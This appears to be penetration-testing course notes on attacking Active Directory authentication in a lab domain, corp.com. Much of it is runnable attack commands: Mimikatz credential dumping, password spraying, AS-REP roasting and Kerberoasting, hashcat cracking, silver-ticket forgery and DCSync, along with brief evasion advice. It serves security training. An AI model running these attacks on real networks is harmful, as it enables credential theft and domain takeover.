# Attacking Active Directory Authentication

Active Directory authentication mechanisms form the backbone of enterprise security, but they also present significant attack surfaces when properly understood and exploited. This module focuses on leveraging enumeration intelligence to compromise AD authentication systems through targeted attacks against password hashes, Kerberos tickets, and authentication protocols.

Building upon the reconnaissance gathered in the Active Directory Introduction and Enumeration module, we will explore how to weaponize user accounts, group memberships, and Service Principal Names (SPNs) to gain unauthorized access and escalate privileges within the corp.com domain environment.

## Table of Contents

### 1. [Understanding Active Directory Authentication](#understanding-active-directory-authentication)
- **1.1 [NTLM Authentication](#ntlm-authentication)**
- **1.2 [Kerberos Authentication](#kerberos-authentication)**
- **1.3 [Windows Credential Caching](#windows-credential-caching)**

### 2. [Performing Attacks on Active Directory Authentication](#performing-attacks-on-active-directory-authentication)
- **2.1 [Password Hash Attacks](#password-hash-attacks)**
- **2.2 [AS-REP Roasting](#as-rep-roasting)**
- **2.3 [Kerberoasting](#kerberoasting)**
- **2.4 [Silver Tickets](#silver-tickets)**
- **2.5 [Domain Controller Synchronization (DCSync)](#domain-controller-synchronization-dcsync)**

---

## Understanding Active Directory Authentication

Active Directory supports multiple authentication protocols designed for various scenarios and compatibility requirements. Understanding these mechanisms is crucial for identifying attack vectors and exploitation opportunities within enterprise environments.

**Learning Objectives:**
- Understand NTLM Authentication mechanisms and vulnerabilities
- Understand Kerberos Authentication protocols and attack surfaces
- Become familiar with cached Active Directory credentials and storage

Active Directory implements several authentication protocols to support diverse operating systems and applications. This section explores the technical details of these authentication protocols, their implementation in Active Directory environments, and the credential caching mechanisms that enable both functionality and exploitation opportunities.

---

## NTLM Authentication

NTLM (NT LAN Manager) authentication serves as a critical fallback mechanism in Active Directory environments, particularly when Kerberos authentication is unavailable or inappropriate for specific scenarios.

**NTLM Usage Scenarios:**
- Client authentication to servers via IP address (bypassing hostname resolution)
- Authentication to hostnames not registered in Active Directory-integrated DNS
- Third-party applications that specifically implement NTLM over Kerberos
- Legacy system compatibility requirements

### NTLM Authentication Flow

The NTLM authentication process consists of a seven-step challenge-response mechanism involving the client, application server, and domain controller:

**Step 1-2:** Client calculates NTLM hash from password and sends username to target server
**Step 3:** Server generates random nonce (challenge) and returns to client
**Step 4:** Client encrypts nonce using stored NTLM hash and sends response
**Step 5-6:** Server forwards authentication data to domain controller; DC validates by comparing encrypted nonce results
**Step 7:** Authentication result communicated back through server to client

### NTLM Security Characteristics

**Cryptographic Properties:**
- **Hash Algorithm:** MD4-based (inherently weak)
- **Speed:** Fast-hashing algorithm enables efficient offline attacks
- **Salt:** No salt used (enables rainbow table attacks)

**Attack Surface:**
- **Brute Force:** High-speed hash testing possible (600+ billion hashes/second with high-end GPUs)
- **Pass-the-Hash:** NTLM hashes can be used directly for authentication
- **Relay Attacks:** NTLM authentication can be relayed to other services

---

## Kerberos Authentication

Kerberos serves as the primary authentication protocol in Active Directory environments since Windows Server 2003, representing a sophisticated ticket-based system that provides enhanced security features over NTLM.

**Kerberos Foundation:**
- **Origin:** Based on MIT's Kerberos version 5 protocol
- **Architecture:** Ticket-based authentication system
- **Key Distribution Center (KDC):** Domain controllers serve dual roles as authentication servers

### Kerberos Authentication Flow

The Kerberos authentication process involves a six-step ticket exchange mechanism:

**Step 1-2:** Client sends AS-REQ (username + encrypted timestamp) to KDC; KDC validates and returns AS-REP (session key + TGT)
**Step 3-4:** Client sends TGS-REQ (encrypted username/timestamp + resource name + TGT) to KDC; KDC validates and returns TGS-REP (service ticket)
**Step 5-6:** Client sends AP-REQ (encrypted username/timestamp + service ticket) to application server; server validates and grants access

### Kerberos Security Architecture

**Authentication Strengths:**
- **Mutual Authentication:** Both client and server identities verified
- **No Password Transmission:** Passwords never sent over network
- **Replay Protection:** Timestamp validation prevents replay attacks
- **Single Sign-On:** TGT enables access to multiple resources

**Ticket Components:**
- **TGT:** Encrypted with krbtgt account hash, default 10-hour lifetime
- **Service Tickets:** Encrypted with service account password hash, per-service basis

### Kerberos Attack Surface

**Ticket-Based Vulnerabilities:**
- **Kerberoasting:** Service account password hash extraction via service tickets
- **ASREPRoast:** Targeting accounts with pre-authentication disabled
- **Golden Tickets:** krbtgt hash compromise enables domain-wide access
- **Silver Tickets:** Service account hash compromise enables service-specific access

---

## Windows Credential Caching

Windows systems cache authentication credentials and tickets in memory to enable single sign-on functionality. Understanding these caching mechanisms is crucial for credential harvesting attacks.

### LSASS Memory Storage

**Local Security Authority Subsystem Service (LSASS):**
- **Primary Function:** Manages authentication credentials and security policies
- **Memory Storage:** Caches password hashes, Kerberos tickets, and authentication tokens
- **Process Privileges:** Runs as SYSTEM with elevated security context

**Credential Types Stored:**
- **NTLM Hashes:** Domain user password hashes for authentication
- **Kerberos Tickets:** TGTs and service tickets for current sessions
- **Plaintext Passwords:** When WDigest authentication is enabled (legacy systems)
- **Certificate Private Keys:** PKI credentials for certificate-based authentication

### Mimikatz: Credential Extraction Tool

**Prerequisites:**
- Administrative privileges (local administrator or SYSTEM access)
- SeDebugPrivilege to interact with LSASS process

**Basic Credential Extraction:**
```powershell
# Launch Mimikatz and enable debug privileges
.\mimikatz.exe
privilege::debug

# Extract cached credentials
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets
```

**Hash Types and Functional Levels:**
- **Windows 2003:** NTLM hashes only
- **Windows 2008+:** NTLM and SHA-1 hashes available
- **Legacy Systems:** WDigest enabled = plaintext passwords exposed

### Defensive Countermeasures

**LSA Protection:**
- Enable additional LSA protection via registry key
- Prevents unauthorized LSASS memory access

**WDigest Disabling:**
- Disabled by default on modern systems (Windows 8.1+/Server 2012 R2+)
- Manual disabling required on legacy systems

**OpSec Considerations:**
- Well-known tool with established signatures
- Use memory injection or process dumping for evasion
- Alternative tools and obfuscation techniques available

---

## Performing Attacks on Active Directory Authentication

Building upon our understanding of AD authentication mechanisms and credential caching, we explore practical attack techniques that exploit these systems to gain unauthorized access and escalate privileges within domain environments.

---

## Password Hash Attacks

Password attacks against Active Directory leverage various vectors including password spraying, hash extraction, and credential reuse. Understanding account lockout policies and implementing stealthy attack methodologies are crucial for successful credential compromise.

### Account Lockout Policy Analysis

**Reconnaissance:**
```powershell
# Examine domain account policy
net accounts
```

**Critical Policy Parameters:**
- **Lockout Threshold:** 5 failed attempts trigger account lockout
- **Lockout Duration:** 30-minute lockout period  
- **Observation Window:** 30-minute reset period for failed attempts
- **Safe Attack Window:** 4 attempts per user before lockout risk

**Attack Calculation:** 192 login attempts per user per 24-hour period (4 attempts, wait 30 minutes, repeat cycle)

### LDAP-Based Password Spraying

**DirectoryEntry Authentication Method:**
LDAP-based authentication provides stealthy password validation with minimal network noise.

```powershell
# Build LDAP connection string dynamically
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://$PDC/DC=$($domainObj.Name.Replace('.', ',DC='))"

# Test credentials via DirectoryEntry constructor
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

**Successful Authentication:** Returns distinguishedName and Path properties
**Failed Authentication:** Throws exception with "username or password is incorrect" message

### Automated Password Spraying with Spray-Passwords.ps1

```powershell
# Navigate to tools directory and bypass execution policy
cd C:\Tools
powershell -ep bypass

# Execute password spray attack
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**Command Parameters:**
- **-Pass:** Single password to test against all users
- **-File:** Wordlist file for multiple password attempts  
- **-Admin:** Include administrative accounts in attack scope

**Attack Features:**
- Account policy awareness (respects lockout thresholds)
- Automatic user enumeration
- Real-time feedback on successful authentications

### SMB-Based Password Spraying with CrackMapExec

```bash
# Create target user list
echo -e "dave\njen\npete" > users.txt

# Execute SMB-based password spray
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Administrative Privilege Detection:**
"Pwn3d!" indicator shows local admin rights for successful credentials

**SMB Method Characteristics:**
- High network noise (full SMB connection per attempt)
- Slower performance due to connection overhead
- No account policy awareness

### Kerberos-Based Password Spraying with Kerbrute

```powershell
# Execute Kerberos-based password spray (minimal network traffic)
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

**Kerberos Method Advantages:**
- Minimal network traffic (only AS-REQ and AS-REP packets)
- Fastest password spraying method
- Direct KDC communication

### Password Spraying Method Comparison

| Method | Tool | Network Noise | Speed | Admin Detection | Policy Awareness |
|--------|------|---------------|-------|-----------------|------------------|
| **LDAP** | Spray-Passwords.ps1 | Low | Medium | No | Yes |
| **SMB** | CrackMapExec | High | Slow | Yes | No |
| **Kerberos** | Kerbrute | Minimal | Fast | No | No |

---

## AS-REP Roasting

AS-REP Roasting exploits accounts with disabled Kerberos pre-authentication, allowing attackers to request AS-REP responses containing encrypted material for offline password attacks.

### Vulnerability Identification

**Account Configuration:** "Do not require Kerberos preauthentication" account option must be enabled (disabled by default)
**Common Causes:** Legacy application compatibility requirements
**Security Impact:** Enables offline password attacks without prior authentication

### Linux-Based AS-REP Roasting with Impacket

```bash
# Enumerate accounts without pre-authentication required
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete

# Request AS-REP hashes for vulnerable accounts
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

### Windows-Based AS-REP Roasting with Rubeus

```powershell
# Navigate to tools directory and execute AS-REP roasting attack
cd C:\Tools
.\Rubeus.exe asreproast /nowrap
```

**Command Parameters:**
- **asreproast:** Specify AS-REP roasting attack mode
- **/nowrap:** Prevent line breaks in hash output (improves copy/paste)

### Hash Cracking with Hashcat

```bash
# Identify correct mode for AS-REP hashes (mode 18200)
hashcat --help | grep -i "Kerberos"

# Crack AS-REP hash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Targeted AS-REP Roasting

**Prerequisites:** GenericWrite or GenericAll permissions on target user account

```powershell
# Disable pre-authentication for target user
Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304}

# Perform AS-REP roasting
.\Rubeus.exe asreproast /user:<target_user> /nowrap

# Reset user account control (cleanup)
Set-DomainObject -Identity <target_user> -XOR @{useraccountcontrol=4194304}
```

---

## Kerberoasting

Kerberoasting exploits the Kerberos ticket-granting process by requesting service tickets for Service Principal Names (SPNs), then performing offline password attacks against the encrypted portions.

### Service Ticket Request Process

1. **TGS-REQ:** Client requests service ticket for specific SPN
2. **No Authorization Check:** Domain controller issues ticket without permission validation
3. **Service Ticket:** Encrypted with service account password hash
4. **Authorization Check:** Performed only when accessing actual service

### Windows-Based Kerberoasting with Rubeus

```powershell
# Navigate to tools directory and execute Kerberoasting attack
cd C:\Tools
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Linux-Based Kerberoasting with Impacket

```bash
# Request service tickets for all SPNs
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

### TGS-REP Hash Cracking

```bash
# Crack TGS-REP hash using mode 13100
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Service Account Types and Attack Success

**High-Value Targets (User Accounts):**
- Domain user accounts with weak, static passwords
- Service accounts with predictable password patterns
- Legacy accounts with unchanged default passwords

**Difficult Targets (System Accounts):**
- Computer accounts (120-character randomly generated passwords)
- Managed Service Accounts (MSA/gMSA) with automatically managed complex passwords
- krbtgt account (120-character random password, changed infrequently)

### Targeted Kerberoasting

**Prerequisites:** GenericWrite or GenericAll permissions on target user account

```powershell
# Set SPN on target user account
Set-DomainObject -Identity <target_user> -Set @{serviceprincipalname='HTTP/fake.corp.com'}

# Perform Kerberoasting
.\Rubeus.exe kerberoast /user:<target_user> /nowrap

# Remove SPN (cleanup)
Set-DomainObject -Identity <target_user> -Clear serviceprincipalname
```

---

## Silver Tickets

Silver tickets represent forged Kerberos service tickets created using compromised service account credentials, enabling unauthorized access to specific services while bypassing normal authentication mechanisms.

### Service Ticket Forgery Fundamentals

**Kerberos Service Ticket Trust Model:**
- Applications verify service tickets using service account password hash
- Applications typically trust ticket integrity without additional validation
- Permissions determined by group memberships embedded in service ticket
- PAC validation is optional and rarely implemented

**Attack Prerequisites:**
1. **SPN Password Hash:** NTLM hash of service account
2. **Domain SID:** Security Identifier of the target domain  
3. **Target SPN:** Specific Service Principal Name to access

### Information Gathering for Silver Tickets

**Access Verification (Baseline Test):**
```powershell
# Test current access to target resource
iwr -UseDefaultCredentials http://web04
```
*Expected:* 401 Unauthorized error

**Service Account Hash Extraction:**
```powershell
# Launch Mimikatz as Administrator
cd C:\Tools
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Domain SID Retrieval:**
```powershell
# Obtain current user SID (extract domain portion, remove RID)
whoami /user
```
*Example:* `S-1-5-21-1987370270-658905905-1781884369-1105` → Domain SID: `S-1-5-21-1987370270-658905905-1781884369`

### Silver Ticket Creation with Mimikatz

```mimikatz
# Create silver ticket with elevated privileges
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

**Command Parameters:**
- **/sid:** Domain Security Identifier
- **/domain:** Target domain name
- **/ptt:** Pass-the-ticket (inject into current session)
- **/target:** Target server/service FQDN
- **/service:** Service protocol (http, cifs, ldap, etc.)
- **/rc4:** NTLM hash of service account
- **/user:** Username to impersonate (can be any domain user)

**Automatic Privilege Assignment:**
- User ID 500 (Built-in local administrator)
- Group 512 (Domain Admins)
- Groups 513, 518, 519, 520 (Various high-privilege groups)

### Ticket Verification and Usage

```powershell
# Verify ticket injection
klist

# Test service access with forged ticket
iwr -UseDefaultCredentials http://web04
```
*Expected:* HTTP 200 OK response indicating successful access

### Silver Ticket Attack Variations

```mimikatz
# CIFS/SMB service ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:cifs /rc4:<ntlm_hash> /user:<username>

# LDAP service ticket  
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:ldap /rc4:<ntlm_hash> /user:<username>

# MSSQL service ticket
kerberos::golden /sid:<domain_sid> /domain:<domain> /ptt /target:<target_server> /service:mssql /rc4:<ntlm_hash> /user:<username>
```

---

## Domain Controller Synchronization (DCSync)

DCSync attacks exploit Active Directory replication mechanisms to impersonate domain controllers and extract user credentials directly from domain controllers without requiring direct access to domain controller systems.

### Directory Replication Service (DRS) Protocol

**Replication Mechanism:**
- **Purpose:** Synchronize domain controllers in multi-DC environments
- **API:** IDL_DRSGetNCChanges for requesting object updates
- **Authentication:** SID-based privilege verification (not DC identity verification)
- **Vulnerability:** Accepts replication requests from any appropriately privileged account

**Required Privileges:**
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

**Default Privilege Holders:** Domain Admins, Enterprise Admins, Administrators

### Windows-Based DCSync with Mimikatz

```powershell
# Navigate to tools directory and launch Mimikatz
cd C:\Tools
.\mimikatz.exe

# Execute DCSync attack against specific user
lsadump::dcsync /user:corp\dave
```

**DCSync Command Parameters:**
- **lsadump::dcsync:** Mimikatz module for DCSync attacks
- **/user:** Target username in domain\username format
- **/domain:** Optional domain specification
- **/dc:** Optional domain controller specification

### Linux-Based DCSync with Impacket

```bash
# Target specific user
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

**Command Parameters:**
- **-just-dc-user:** Target specific user for credential extraction
- **corp.com/jeffadmin:** Domain/username for authentication
- **@192.168.50.70:** Domain controller IP address

### Hash Cracking and Analysis

```bash
# Save NTLM hash to file and crack with Hashcat
echo "08d7a47a6f9f66b97b1bae4178747494" > hashes.dcsync
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Advanced DCSync Techniques

```bash
# Extract all domain user credentials
impacket-secretsdump corp.com/jeffadmin:"password"@192.168.50.70

# Target computer accounts (machine accounts)
impacket-secretsdump -just-dc-user "CLIENT75$" corp.com/jeffadmin:"password"@192.168.50.70

# Use NTLM hash instead of password
impacket-secretsdump -just-dc-user <username> -hashes :<ntlm_hash> <domain>/<user>@<dc_ip>
```

### Credential Types Extracted

- **NTLM Hashes:** Primary authentication hashes
- **LM Hashes:** Legacy authentication hashes (if enabled)
- **Kerberos Keys:** AES256, AES128, DES encryption keys
- **Password History:** Previous password hashes
- **Supplemental Credentials:** Additional authentication data

### High-Value Targets

- **Administrator:** Built-in domain administrator
- **krbtgt:** Key Distribution Center service account
- **Service Accounts:** High-privilege service accounts
- **Computer Accounts:** Machine account credentials

DCSync attacks demonstrate the critical importance of protecting highly privileged accounts and implementing comprehensive monitoring for replication activities in Active Directory environments.
